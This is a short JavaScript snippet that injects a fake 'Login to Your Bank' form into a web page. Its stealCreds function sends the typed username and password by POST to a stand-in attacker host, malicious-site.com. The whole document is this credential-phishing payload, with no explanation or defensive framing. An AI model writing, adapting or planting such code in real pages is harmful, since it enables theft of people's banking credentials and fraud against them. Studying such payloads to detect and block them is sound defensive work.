document.body.innerHTML += `
    <div id="fakeLogin">
        <h2>Login to Your Bank</h2>
        <input type="text" id="username">
        <input type="password" id="password">
        <button onclick="stealCreds()">Login</button>
    </div>
    <script>
        function stealCreds() {
            fetch("https://malicious-site.com/creds", {
                method: "POST",
                body: JSON.stringify({
                    user: document.getElementById('username').value,
                    pass: document.getElementById('password').value
                })
            });
        }
    </script>
`;
